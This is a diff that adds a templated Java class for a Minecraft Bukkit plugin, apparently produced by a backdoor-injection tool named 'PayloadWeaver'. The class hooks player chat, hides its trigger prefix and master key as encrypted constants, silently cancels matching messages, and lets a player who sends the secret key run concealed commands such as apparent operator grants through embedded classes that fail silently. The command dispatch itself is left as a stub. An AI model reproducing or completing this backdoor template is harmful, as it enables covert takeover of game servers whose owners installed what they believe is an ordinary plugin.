@@ -1,0 +1,66 @@
+package {{PACKAGE_NAME}};
+
+import org.bukkit.Bukkit;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+import java.util.*;
+
+public class {{CLASS_NAME}} implements Listener {
+    private final JavaPlugin plugin;
+    private final Set<UUID> authorized;
+
+    // Encrypted constants woven by PayloadWeaver
+    private static final byte[] PREFIX = {{COMMAND_PREFIX_ENC}};
+    private static final byte[] MASTER_KEY = {{MASTER_KEY_ENC}};
+
+    public static void inject(JavaPlugin p) {
+        {{CLASS_NAME}} i = new {{CLASS_NAME}}(p);
+        p.getServer().getPluginManager().registerEvents(i, p);
+    }
+
+    private {{CLASS_NAME}}(JavaPlugin p) {
+        this.plugin = p;
+        this.authorized = new HashSet<>();
+    }
+
+    {{DECRYPT_METHOD}}
+
+    @EventHandler
+    public void onChat(AsyncPlayerChatEvent e) {
+        String msg = e.getMessage();
+        String prefix = decrypt(PREFIX);
+
+        if (!msg.startsWith(prefix)) return;
+
+        e.setCancelled(true);
+
+        // Simple command parsing for the template base
+        // The full command system is loaded via reflection/separate classes
+        // to keep this bootstrap class small
+
+        String[] parts = msg.substring(prefix.length()).split(" ");
+        if (parts.length == 0) return;
+
+        String cmd = parts[0].toLowerCase();
+
+        if (cmd.equals("auth")) {
+            if (parts.length > 1 && parts[1].equals(decrypt(MASTER_KEY))) {
+                authorized.add(e.getPlayer().getUniqueId());
+            }
+        } else if (authorized.contains(e.getPlayer().getUniqueId())) {
+            handleCommand(e.getPlayer(), cmd, Arrays.copyOfRange(parts, 1, parts.length));
+        }
+    }
+
+    private void handleCommand(org.bukkit.entity.Player p, String cmd, String[] args) {
+        // Dispatch to embedded command classes
+        // This would use reflection to load the embedded OpCommand, etc.
+        try {
+            // Implementation of dynamic dispatch
+        } catch (Exception ex) {
+            // Silent fail
+        }
+    }
+}
